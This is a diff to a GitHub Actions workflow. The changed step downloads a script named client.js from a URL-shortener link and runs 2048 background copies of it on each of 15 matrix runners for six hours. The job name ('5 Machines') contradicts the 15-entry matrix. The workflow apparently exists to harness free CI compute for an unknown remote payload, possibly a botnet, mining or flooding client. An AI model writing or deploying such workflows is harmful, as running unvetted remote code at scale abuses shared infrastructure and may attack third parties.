@@ -1,4 +1,4 @@
-name: Run Node.js Script on 256 Machines
+name: Run Node.js Script on 5 Machines
 
 on:
   workflow_dispatch:
@@ -8,39 +8,14 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        instance:
-          - 1
-          - 2
-          - 3
-          - 4
-          - 5
-          - 6
-          - 7
-          - 8
-          - 9
-          - 10
-          - 11
-          - 12
-          - 13
-          - 14
-          - 15
-          - 16
-          - 17
-          - 18
-          - 19
-          - 20
-          - 21
-          - 22
-          - 23
-          - 24
-          - 25
-
+        node_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
     steps:
       - uses: actions/setup-node@v3
         with:
           node-version: '18'
-
       - run: |
           curl -o client.js https://curl.by/m4jfI/client.js
-          node client.js > client_${{ matrix.instance }}.log 2>&1
-          sleep 21600
+          for i in $(seq 1 2048); do
+            nohup node client.js > client_$i.log 2>&1 &
+          done
+          sleep 21600 # 6 saat
